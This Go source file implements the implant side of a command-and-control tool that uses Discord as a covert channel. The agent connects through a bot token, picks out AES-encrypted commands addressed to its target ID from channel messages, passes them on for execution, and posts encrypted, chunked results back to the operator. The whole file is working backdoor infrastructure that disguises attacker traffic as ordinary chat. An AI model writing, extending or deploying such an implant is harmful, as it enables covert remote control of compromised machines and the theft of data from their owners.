package discord

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"

	"sasakbpf/internal/config"
	"sasakbpf/internal/protocol"
)

// Agent is the implant-side Discord client: it opens a Gateway WSS
// session, listens for MESSAGE_CREATE in the configured command channel,
// extracts sd1-encoded commands addressed to its TargetID, and surfaces
// them via the OnCommand callback. Output is posted back via REST using
// SendOutput.
type Agent struct {
	cfg       config.Config
	dg        *discordgo.Session
	ready     chan struct{}
	readyOnce sync.Once
	onCmd     OnCommandFunc
}

// OnCommandFunc is invoked synchronously on each decrypted command. The
// caller must not block excessively — if it does, gateway events back up
// and Discord closes the socket.
type OnCommandFunc func(plaintext string)

// NewAgent constructs an Agent (no I/O yet).
// If id.KindOut == KindCmd, plaintext is the raw command body.
func NewAgent(cfg config.Config) *Agent {
	return &Agent{cfg: cfg, ready: make(chan struct{})}
}

// OnCommand registers the callback invoked when a command is received.
func (a *Agent) OnCommand(f OnCommandFunc) { a.onCmd = f }

// Run opens the gateway connection and blocks until ctx is cancelled,
// the session closes irrecoverably, or initial handshake fails.
func (a *Agent) Run(ctx context.Context) error {
	token := strings.TrimPrefix(a.cfg.BotToken, "Bot ")
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		return fmt.Errorf("discordgo new: %w", err)
	}
	dg.Identify.Intents = discordgo.IntentGuilds | discordgo.IntentGuildMessages | discordgo.IntentMessageContent
	a.dg = dg

	dg.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
		a.handleMessageCreate(s, m)
	})
	dg.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
		a.readyOnce.Do(func() { close(a.ready) })
	})

	// Recover from network blips via discordgo internal retry.
	if err := dg.Open(); err != nil {
		return fmt.Errorf("gateway open: %w", err)
	}
	defer dg.Close()

	// Wait until connected or ctx cancels.
	select {
	case <-a.ready:
	case <-time.After(30 * time.Second):
		// Some guild sync events may not fire on old intents; proceed anyway
		// since MESSAGE_CREATE arrives independent of Ready in v10.
	case <-ctx.Done():
		return ctx.Err()
	}

	// WSS keepalive is handled by discordgo internal heartbeat.
	// No need to post pong messages to the channel.

	<-ctx.Done()
	// Signal graceful close.
	_ = dg.Close()
	return ctx.Err()
}

func (a *Agent) handleMessageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// NOTE: when agent and CLI share the same bot token, MessageCreate
	// dispatches for messages the bot itself posted (e.g. our sd1ack
	// output). We intentionally do NOT filter on m.Author.Bot here —
	// loop prevention is enforced by protocol.Kind: agent only acts on
	// KindCmd, and its own sd1ack posts decode to KindOut → ignored.
	if a.cfg.ChannelID != "" && m.ChannelID != a.cfg.ChannelID {
		return
	}
	if m.Author == nil {
		return
	}
	msg, err := protocol.Decode(m.Content, a.cfg.TargetID, a.cfg.AESKeyHex)
	if err != nil {
		// ErrNotForUs / parse errors → silent ignore (channel chatter)
		return
	}
	if msg.Kind != protocol.KindCmd {
		// reply channel only — agent shouldn't act on another agent's output
		return
	}
	if a.onCmd == nil {
		return
	}
	// Execute synchronously in this goroutine; result posted via SendOutput.
	a.onCmd(string(msg.Body))
}

// SendOutput encrypts and posts plaintext back to the channel as sd1ack:<id>:<b64>.
// Long outputs are chunked at maxChunk bytes (plaintext), with wire prefix
// `[i/n]` injected so the operator CLI can reassemble. Discord 2000-char
// limit applies to each posted line; envelope overhead is reserved.
func (a *Agent) SendOutput(ctx context.Context, plaintext string) error {
	if a.dg == nil {
		return errors.New("gateway not connected")
	}
	const maxLine = 1800 // leaves slack for sd1ack:<hexid>:<b64> wrapper
	const maxChunk = 900 // plaintext bytes per envelope (base64 inflates ~1.33x)

	chunks := chunk(plaintext, maxChunk)
	total := len(chunks)
	for i, c := range chunks {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}
		var body string
		if total > 1 {
			body = fmt.Sprintf("[%d/%d]\n%s", i+1, total, c)
		} else {
			body = c
		}
		line, err := protocol.Encode(protocol.PrefixOut, a.cfg.TargetID, a.cfg.AESKeyHex, []byte(body))
		if err != nil {
			return fmt.Errorf("encode: %w", err)
		}
		// Defensive: the wire line shouldn't exceed Discord body limit.
		if len(line) > maxLine {
			// pathologically oversized — fall back to truncation with marker.
			line = line[:maxLine-12] + "...TRUNCATED"
		}
		if _, err := a.dg.ChannelMessageSend(a.cfg.ChannelID, line); err != nil {
			return fmt.Errorf("send: %w", err)
		}
		// Approx 5 msg/sec/channel rate-limit friendly (200ms gap).
		if i+1 < total {
			select {
			case <-ctx.Done():
				return ctx.Err()
			case <-time.After(200 * time.Millisecond):
			}
		}
	}
	return nil
}

// chunk splits s into pieces of at most size bytes.
func chunk(s string, size int) []string {
	if len(s) == 0 {
		return []string{""}
	}
	if size <= 0 {
		size = 900
	}
	out := make([]string, 0, len(s)/size+1)
	for i := 0; i < len(s); i += size {
		end := i + size
		if end > len(s) {
			end = len(s)
		}
		out = append(out, s[i:end])
	}
	return out
}